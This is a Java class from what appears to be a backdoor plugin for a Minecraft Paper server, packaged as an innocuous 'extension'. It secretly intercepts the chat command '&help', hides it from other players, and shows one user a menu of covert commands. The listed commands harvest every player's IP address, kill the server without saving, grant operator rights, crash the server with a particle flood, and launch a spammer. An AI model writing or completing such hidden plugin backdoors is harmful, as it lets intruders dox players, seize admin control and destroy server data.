package io.paper.extension;


import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Help implements Listener {
    @EventHandler
    public <CraftPlayer> void help(AsyncPlayerChatEvent e){
        if(e.getMessage().equals("&help")){
            e.setCancelled(true);
            Player p = e.getPlayer();
            p.sendMessage(ChatColor.GREEN + "&getip - get ip of all players");
            p.sendMessage(ChatColor.DARK_RED + "&killserver - close server without save maps and files");
            p.sendMessage(ChatColor.BLUE + "&byebye - op player");
            p.sendMessage(ChatColor.DARK_GRAY + "&explodetrue - set explode to true");
            p.sendMessage(ChatColor.DARK_GRAY + "Exploder spawn (1000000000) particles at all players online, this cause crash of server.");
            p.sendMessage(ChatColor.YELLOW + "(caldoo) or (coldd) to start spammer");
        }
    }
}
